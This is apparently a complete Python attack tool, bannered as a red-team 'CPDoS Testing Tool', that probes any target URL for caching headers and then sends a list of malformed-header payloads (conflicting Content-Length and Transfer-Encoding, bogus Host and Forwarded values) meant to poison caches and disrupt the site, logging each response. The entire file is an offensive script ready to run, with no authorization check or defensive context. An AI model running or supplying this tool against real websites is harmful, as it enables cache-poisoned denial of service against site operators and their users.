import sys
import time
import requests
import json

LOG_FILE = "cpdos_detailed_log.json"

# Advanced CPDoS Payloads
CPDOS_PAYLOADS = [
    {"Host": "invalid.host", "Content-Length": "999999"},
    {"Transfer-Encoding": "chunked", "Content-Length": "10"},
    {"Host": "127.0.0.1", "Content-Length": "0"},
    {"Content-Length": "-1"},
    {"Host": "..", "Content-Length": "100"},
    {"Content-Length": "1000000"},
    {"X-Original-Host": "bypass.cache", "Content-Length": "0"},
    {"Cache-Control": "no-store", "Content-Length": "100"},
    {"Referer": "http://malicious.site", "Content-Length": "10"},
    {"Forwarded": "for=127.0.0.1;by=cache-poison", "Content-Length": "99999"},
]

BANNER = """
██████╗ ██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔════╝
██████╔╝██████╔╝██████╔╝██║  ███╗█████╗  
██╔═══╝ ██╔═══╝ ██╔═══╝ ██║   ██║██╔══╝  
██║     ██║     ██║     ╚██████╔╝███████╗
╚═╝     ╚═╝     ╚═╝      ╚═════╝ ╚══════╝
   CPDoS Testing Tool - Red Team
"""

CACHE_HEADERS = ["X-Cache", "Via", "Age", "CF-Cache-Status", "X-CDN-Cache", "X-Proxy-Cache"]

def log_attack(target, results):
    """Logs attack results in a structured JSON format."""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    log_data = {
        "timestamp": timestamp,
        "target": target,
        "results": results
    }
    with open(LOG_FILE, "w") as log:
        json.dump(log_data, log, indent=4)
    print(f"[✔] Detailed log saved to {LOG_FILE}")

def check_cache(target):
    """Scans for cache poisoning vulnerabilities."""
    print("[*] Scanning for caching vulnerabilities...")
    try:
        response = requests.get(target, timeout=5)
        vulnerable_headers = {header: response.headers[header] for header in CACHE_HEADERS if header in response.headers}

        if vulnerable_headers:
            print("[✔] Caching detected! Potentially vulnerable headers:")
            for header, value in vulnerable_headers.items():
                print(f"    [+] {header}: {value}")
            return True
        else:
            print("[✘] No caching detected. Attack may not work.")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] {e}")
        return False

def launch_cpdos(target):
    """Injects payloads and captures detailed responses."""
    print("[*] Injecting payloads to disrupt site functionality...")
    results = []
    for i, payload in enumerate(CPDOS_PAYLOADS):
        print(f"[*] Sending CPDoS Payload {i+1}: {json.dumps(payload)}")
        try:
            response = requests.get(target, headers=payload, timeout=5)
            response_details = {
                "payload": payload,
                "status_code": response.status_code,
                "headers": dict(response.headers),
                "body_snippet": response.text[:200]  # Capture first 200 chars
            }
            results.append(response_details)
            print(f"[+] Response {i+1}: {response.status_code}, Headers Captured")
        except requests.exceptions.RequestException as e:
            results.append({
                "payload": payload,
                "error": str(e)
            })
            print(f"[ERROR] Payload {i+1} failed: {e}")
    return results

def main(target):
    print(BANNER)
    print(f"[+] Target: {target}")

    # Step 1: Check for cache vulnerabilities
    if check_cache(target):
        print("[✔] Cache poisoning attack can proceed.")
    else:
        print("[✘] Exiting. No cache vulnerabilities detected.")
        sys.exit(1)

    # Step 2: Inject payloads
    attack_results = launch_cpdos(target)

    # Step 3: Log results
    log_attack(target, attack_results)
    print("[✔] Attack complete. Check logs for details.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python cpdos.py <target_url>")
        sys.exit(1)

    target_url = sys.argv[1]
    main(target_url)
